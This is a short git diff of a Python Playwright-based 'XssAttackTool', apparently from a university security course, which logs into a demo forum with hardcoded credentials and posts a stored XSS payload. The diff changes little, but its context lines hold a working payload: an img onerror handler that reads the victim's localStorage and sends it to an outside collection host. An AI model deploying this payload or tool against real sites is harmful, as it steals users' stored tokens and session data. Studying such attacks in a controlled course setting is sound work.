@@ -21,10 +21,10 @@ class XssAttackToolConfig:
 
 
 class XssAttackTool:
-    def __init__(self, config: XssAttackToolConfig):
+    def __init__(self, config: XssAttackToolConfig, headless: bool = True):
         self.config = config
 
-        self.browser = sync_playwright().start().chromium.launch(headless=False)
+        self.browser = sync_playwright().start().chromium.launch(headless=headless)
         self.context = self.browser.new_context()
         self.page = self.context.new_page()
 
@@ -101,12 +101,12 @@ class XssAttackTool:
 
 
 if __name__ == '__main__':
-    config = XssAttackToolConfig(
+    xat_config = XssAttackToolConfig(
         target_app_url="https://elec0138-forum.0138019.xyz/",
         target_app_username="xss_demo",
         target_app_password="xss_demo_password",
         xss_payload="""<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""
     )
 
-    attack_tool = XssAttackTool(config)
+    attack_tool = XssAttackTool(xat_config, headless=False)
     attack_tool.execute("disable")
